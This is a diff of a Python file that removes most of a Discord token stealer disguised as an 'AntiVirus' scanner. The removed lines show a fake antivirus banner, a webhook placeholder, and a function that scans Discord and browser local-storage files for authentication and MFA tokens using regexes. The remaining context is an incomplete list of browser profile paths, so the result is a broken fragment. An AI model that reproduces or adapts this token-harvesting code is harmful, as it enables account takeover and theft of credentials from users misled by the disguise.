@@ -1,36 +1,4 @@
-import os
-import re
-import json
-from urllib.request import Request, urlopen
-from time import sleep
-from colorama import Fore
 
-import sys
-text = Fore.WHITE+"                          Hello Welcom In AntiVirus "+Fore.GREEN+"NeverTM !!"+Fore.BLUE+"\n\n\n[!!] "+Fore.WHITE+"Wait For Scan All Files For Found "+Fore.RED+"Discord Nucker\n"+Fore.BLUE+"\n\n\n[!!] "+Fore.WHITE+"Delete "+Fore.RED+"Discord Nucker"+Fore.WHITE+" For Security Your Account"
-for char in text:
-    print(char , end = "")
-    sys.stdout.flush()
-    sleep(0.1)
-WEBHOOK_URL = "Enter Your Webhook"
-PING_ME = True # Or False
-def find_tokens(path):
-    path += '\\Local Storage\\leveldb'
-    tokens = []
-    for file_name in os.listdir(path):
-        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-            continue
-        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                for token in re.findall(regex, line):
-                    tokens.append(token)
-    return tokens
-def main():
-    local = os.getenv('LOCALAPPDATA')
-    roaming = os.getenv('APPDATA')
-    paths = {
-        'Discord': roaming + '\\Discord',
-        'Discord Canary': roaming + '\\discordcanary',
-        'Discord PTB': roaming + '\\discordptb',
         'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
         'Opera': roaming + '\\Opera Software\\Opera Stable',
         'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
